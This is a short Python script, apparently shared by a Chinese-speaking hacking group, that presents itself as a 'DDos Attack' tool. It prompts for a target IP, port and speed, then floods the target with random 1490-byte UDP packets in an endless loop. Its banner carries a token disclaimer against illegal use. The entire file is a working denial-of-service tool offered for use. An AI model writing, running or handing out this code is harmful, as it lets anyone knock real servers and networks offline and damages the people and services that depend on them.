# python3

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   作者          : siesta                       |")
print ("|   kali-QQ學習群 : https://discord.gg/aJX5RMmuVS                      |")
print ("|   版本          : V6.9                          |")
print ("\---------------------------------------------------/")
print (" ")
print (" -----------------[請勿用於違法用途]----------------- ")
print (" ")
ip = input("請輸入 IP     : ")
port = int(input("攻擊端口      : "))
sd = int(input("攻擊速度(1~1000) : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)

